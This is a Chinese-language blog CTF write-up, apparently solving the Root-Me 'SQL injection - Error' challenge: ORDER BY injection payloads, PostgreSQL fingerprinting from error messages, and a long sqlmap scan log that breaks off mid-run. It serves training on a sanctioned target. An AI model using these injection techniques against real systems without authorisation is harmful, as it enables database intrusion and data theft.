<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="【Root-Me】 SQL injection - Error, EXP BLOG IT SHARE">
    <meta name="description" content="EXP 技术博客">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>【Root-Me】 SQL injection - Error | 眈眈探求</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/jquery/jquery.min.js"></script>

    <!-- 谷歌自动广告 -->
    
        <!-- 谷歌自动广告 -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4642672915857408" crossorigin="anonymous"></script>

    

    <!-- 加载页面效果 -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/css/loading.css">
<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="眈眈探求" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>




<body>
    
    <div id="loading-box">
        <div class="loading-left-bg"></div>
        <div class="loading-right-bg"></div>
        <div class="spinner-box">
            <div class="configure-border-1">
                <div class="configure-core"></div>
            </div>
            <div class="configure-border-2">
                <div class="configure-core"></div>
            </div>
            <div class="loading-word">加载中...</div>
        </div>
    </div>
    <!-- 页面加载动画 -->
    <script>
        $(document).ready(function () {
            document.body.style.overflow = 'auto';
            document.getElementById('loading-box').classList.add("loaded")
        })
    </script>

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">眈眈探求</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">

      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/tags">
          
          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>标签</span>
        </a>
      </li>
      
      <li>
        <a href="/categories">
          
          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>分类</span>
        </a>
      </li>
      
      <li>
        <a href="/archives">
          
          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>归档</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a target="_blank" rel="noopener" href="https://exp-tools.github.io/site-package/" class="waves-effect waves-light">
      
      <i class="fas fa-tools" style="zoom: 0.6;"></i>
      
      <span>站长工具</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">

      
      <i class="fas fa-wind" style="zoom: 0.6;"></i>
      
      <span>爬虫工具</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a target="_blank" rel="noopener" href="https://exp-tools.github.io/threat-broadcast/">
          
          <i class="fas fa-bug" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>威胁情报</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://exp-tools.github.io/steam-discount/">
          
          <i class="fab fa-steam" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>STEAM 特惠</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">

      
      <i class="fas fa-chalkboard-teacher" style="zoom: 0.6;"></i>
      
      <span>专题教程</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="https://exp-blog.com/categories/%E4%BB%99%E5%A2%83%E4%BC%A0%E8%AF%B4/">
          
          <i class="fas fa-gamepad" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>仙境传说</span>
        </a>
      </li>
      
      <li>
        <a href="https://exp-blog.com/categories/AI/">
          
          <i class="fas fa-robot" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>人工智能</span>
        </a>
      </li>
      
      <li>
        <a href="https://exp-blog.com/categories/%E9%9F%B3%E4%B9%90/">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>流行声乐</span>
        </a>
      </li>
      
      <li>
        <a href="https://exp-blog.com/safe/ctf/ctf-jie-ti-bao-gao-dao-hang/">
          
          <i class="fas fa-skull-crossbones" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>CTF 解题报告</span>
        </a>
      </li>
      
      <li>
        <a href="https://exp-blog.com/algorithm/poj-shi-ti-fen-lei/">
          
          <i class="fas fa-square-root-alt" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>POJ 解题报告</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">

      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/about">
          
          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>关于我</span>
        </a>
      </li>
      
      <li>
        <a href="/contact">
          
          <i class="fas fa-lock" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>文章解锁指引</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://github.com/sponsors/lyy289065406">
          
          <i class="fas fa-donate" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>请我舔冻柠</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://lyy289065406.github.io/sponsor/">
          
          <i class="fas fa-yen-sign" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>请我饮早茶</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://ko-fi.com/exppoc">
          
          <i class="fas fa-dollar-sign" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>请我喝咖啡</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fab fa-gg" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">眈眈探求</div>
        <div class="logo-desc">
            
            EXP 技术博客
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-home"></i>
			
			首页
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/tags " style="margin-left:75px">
				  
				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
			      
		          <span>标签</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories " style="margin-left:75px">
				  
				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
			      
		          <span>分类</span>
                  </a>
                </li>
              
                <li>

                  <a href="/archives " style="margin-left:75px">
				  
				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
			      
		          <span>归档</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a target="_blank" rel="noopener" href="https://exp-tools.github.io/site-package/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tools"></i>
			
			站长工具
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-wind"></i>
			
			爬虫工具
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a target="_blank" rel="noopener" href="https://exp-tools.github.io/threat-broadcast/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-bug" style="position: absolute;left:50px" ></i>
			      
		          <span>威胁情报</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://exp-tools.github.io/steam-discount/ " style="margin-left:75px">
				  
				   <i class="fa fab fa-steam" style="position: absolute;left:50px" ></i>
			      
		          <span>STEAM 特惠</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-chalkboard-teacher"></i>
			
			专题教程
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="https://exp-blog.com/categories/%E4%BB%99%E5%A2%83%E4%BC%A0%E8%AF%B4/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-gamepad" style="position: absolute;left:50px" ></i>
			      
		          <span>仙境传说</span>
                  </a>
                </li>
              
                <li>

                  <a href="https://exp-blog.com/categories/AI/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-robot" style="position: absolute;left:50px" ></i>
			      
		          <span>人工智能</span>
                  </a>
                </li>
              
                <li>

                  <a href="https://exp-blog.com/categories/%E9%9F%B3%E4%B9%90/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>流行声乐</span>
                  </a>
                </li>
              
                <li>

                  <a href="https://exp-blog.com/safe/ctf/ctf-jie-ti-bao-gao-dao-hang/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-skull-crossbones" style="position: absolute;left:50px" ></i>
			      
		          <span>CTF 解题报告</span>
                  </a>
                </li>
              
                <li>

                  <a href="https://exp-blog.com/algorithm/poj-shi-ti-fen-lei/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-square-root-alt" style="position: absolute;left:50px" ></i>
			      
		          <span>POJ 解题报告</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-user-circle"></i>
			
			关于
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/about " style="margin-left:75px">
				  
				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
			      
		          <span>关于我</span>
                  </a>
                </li>
              
                <li>

                  <a href="/contact " style="margin-left:75px">
				  
				   <i class="fa fas fa-lock" style="position: absolute;left:50px" ></i>
			      
		          <span>文章解锁指引</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://github.com/sponsors/lyy289065406 " style="margin-left:75px">
				  
				   <i class="fa fas fa-donate" style="position: absolute;left:50px" ></i>
			      
		          <span>请我舔冻柠</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://lyy289065406.github.io/sponsor/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-yen-sign" style="position: absolute;left:50px" ></i>
			      
		          <span>请我饮早茶</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://ko-fi.com/exppoc " style="margin-left:75px">
				  
				   <i class="fa fas fa-dollar-sign" style="position: absolute;left:50px" ></i>
			      
		          <span>请我喝咖啡</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fab fa-gg"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lyy289065406/exp-blog" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lyy289065406/exp-blog" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('此为非公开文章，可通过顶部导航的【关于 -> 解锁指引】获取密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/featureimages/22.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">【Root-Me】 SQL injection - Error</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #0a8cca;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/">
                                
                                    <span class="chip bg-color">解题报告</span>
                                
                            </a>
                        
                            <a href="/tags/CTF/">
                                
                                    <span class="chip bg-color">CTF</span>
                                
                            </a>
                        
                            <a href="/tags/Root-Me/">
                                
                                    <span class="chip bg-color">Root-Me</span>
                                
                            </a>
                        
                            <a href="/tags/Web-Server/">
                                
                                    <span class="chip bg-color">Web-Server</span>
                                
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="info-break-policy">
                    
                        <span class="post-original-label">原创</span>
                    
                </div>

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2019-11-21
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-11-01
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    4.2k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    19 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <ul>
<li>来源：<a target="_blank" rel="noopener" href="https://www.root-me.org/">Root-Me</a></li>
<li>题型：<a target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/Web-Server/">Web-Server</a></li>
<li>题目：<a target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error">SQL injection - Error</a></li>
<li>分数：40 Points</li>
</ul>
<hr>
<h2 id="试错"><a href="#试错" class="headerlink" title="试错"></a>试错</h2><p>提示是基于错误的 SQL 注入，就是我们要令 SQL 尽可能报错，通过错误找到有用的信息（即账号密码）进行登陆。</p>
<p>注入点其实不难找，多试几次就知道在这里（也只有这里）：</p>
<p><code>http://challenge01.root-me.org/web-serveur/ch34/?action=contents&amp;order=[注入点]</code></p>
<p><img src="./imgs/01.png"></p>
<p>从报错可以知道，注入点在 <code>order by</code> 后面，而且还写死了一列 <code>page</code>，导致可控的 payload 不多。</p>
<p><code>SELECT * FROM contents order by page [注入点]</code></p>
<blockquote>
<p>注：表名 <code>contents</code> 不是注入点，若换了其他表名、或添加其他表，则不会触发这个页面请求。</p>
</blockquote>
<p>在 order 后面随便增加一些列，如注入 <code>,aaa,bbb,ccc,ddd</code>，虽然得到异常信息，但不是很有用：</p>
<p><img src="./imgs/02.png"></p>
<p>这里还可以利用 <code>order by</code> 的特性，直接利用列号代替列名，看看会有什么效果。</p>
<p>发现当注入的列号小于 3 的时候，如注入 <code>,1,2</code> ， SQL 是正常执行的：</p>
<p><img src="./imgs/03.png"></p>
<p>但当注入的列号大于 3 的时候，如注入 <code>,3</code> ， SQL 则报错不存在这列，说明 <code>contents</code> 表只有两列：</p>
<p><img src="./imgs/04.png"></p>
<p>由于其中一列是 <code>page</code> ，我猜测另一列是主键 <code>id</code> ，尝试注入 <code>,id,exp</code> ，蒙对了：</p>
<p><img src="./imgs/05.png"></p>
<p>其实到此为止都没得到什么有用的信息，不过我在操作过程中发现，</p>
<p>注入单引号 <code>'</code> 和双引号 <code>"</code> 除了会引起 SQL 语法错误之外没什么用：</p>
<p><img src="./imgs/06.png"><br><img src="./imgs/07.png"></p>
<p>而只要注入内容中包含分号 <code>;</code> ，就必定会触发攻击检测： <code>attack detected</code> 。</p>
<p>说明这题 <strong>不允许通过分号注入多条 SQL</strong> ：</p>
<p><img src="./imgs/08.png"></p>
<hr>
<h2 id="确定数据库类型"><a href="#确定数据库类型" class="headerlink" title="确定数据库类型"></a>确定数据库类型</h2><blockquote>
<p><strong>为了方便构造 payload ，从这里开始使用 Burp Suite 工具</strong>。</p>
</blockquote>
<p>其实一般情况下，SQL 注入要找到有用信息，主要都是通过 <code>union</code> 或分号 <code>;</code> 横向查找系统表。</p>
<p>但是这题的注入点太蹊跷，在 <code>order by</code> 后面，而且 SQL 没有用括号包围，导致 <code>union</code> 失效。</p>
<p>而分号 <code>;</code> 则会直接被攻击检测系统拦截。由此看来只能另辟蹊径。</p>
<p>不过我在随便注入的时候发现，如果注入 <code>OR 1=1</code> ，会触发一个异常：</p>
<p><code>ERROR:  argument of OR must be type boolean, not type character varying</code></p>
<p>这个异常信息就很意思了，我搜索了一下，发现 <code>not type character varying</code> 是 <strong>PostgreSql</strong> 数据库特有关键字。</p>
<p><img src="./imgs/09.png"></p>
<hr>
<h2 id="通过-sqlmap-找到探针"><a href="#通过-sqlmap-找到探针" class="headerlink" title="通过 sqlmap 找到探针"></a>通过 sqlmap 找到探针</h2><blockquote>
<p>注：PostgreSql 数据库，通常也简称为 pgsql 。</p>
</blockquote>
<p>知道数据库类型，就可以针对性注入了。而对于 pgsql ，据我所知可以在 order by 后面注入的 payload 是不多的。</p>
<p>在这里可以借助 sqlmap 先找到探针。</p>
<p>如果 Burp Suite 已经加了 sqlmap 插件，可以直接把完整的 HTTP 请求发送到 sqlmap （注意这个请求的 URL 不要注入前面的其他东西，保持题目最原始的参数即可）：</p>
<p><img src="./imgs/10.png"><br><img src="./imgs/11.png"></p>
<p>这里记录了 sqlmap 的扫描结果：</p>
<pre class="line-numbers language-shell"><code class="language-shell">S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552703940473.req
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.3.23#dev}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:39:03 /2019-03-16/

[10:39:03] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552703940473.req'
[10:39:04] [INFO] testing connection to the target URL
[10:39:05] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:39:05] [INFO] testing if the target URL content is stable
[10:39:06] [INFO] target URL content is stable
[10:39:06] [INFO] testing if GET parameter 'action' is dynamic
[10:39:06] [INFO] GET parameter 'action' appears to be dynamic
[10:39:07] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
[10:39:07] [INFO] testing for SQL injection on GET parameter 'action'
[10:39:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:39:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:39:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:39:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:39:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:39:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:39:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:39:21] [INFO] testing 'MySQL inline queries'
[10:39:22] [INFO] testing 'PostgreSQL inline queries'
[10:39:22] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:39:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:39:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:39:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:39:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[10:39:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:39:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:39:33] [INFO] testing 'Oracle AND time-based blind'
[10:39:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:40:01] [WARNING] GET parameter 'action' does not seem to be injectable
[10:40:01] [INFO] testing if GET parameter 'order' is dynamic
[10:40:02] [WARNING] GET parameter 'order' does not appear to be dynamic
[10:40:02] [INFO] heuristic (basic) test shows that GET parameter 'order' might be injectable (possible DBMS: 'PostgreSQL')
[10:40:03] [INFO] testing for SQL injection on GET parameter 'order'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:40:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:40:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:40:28] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:40:31] [WARNING] reflective value(s) found and filtering out
[10:41:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[10:41:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[10:41:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[10:41:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[10:41:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[10:41:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:41:54] [INFO] GET parameter 'order' appears to be 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' injectable
[10:41:54] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:41:55] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[10:41:55] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[10:41:56] [INFO] GET parameter 'order' is 'PostgreSQL error-based - ORDER BY, GROUP BY clause' injectable
[10:41:56] [INFO] testing 'PostgreSQL inline queries'
[10:41:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:41:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[10:41:57] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:41:58] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[10:41:58] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[10:41:59] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[10:41:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:42:02] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[10:42:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
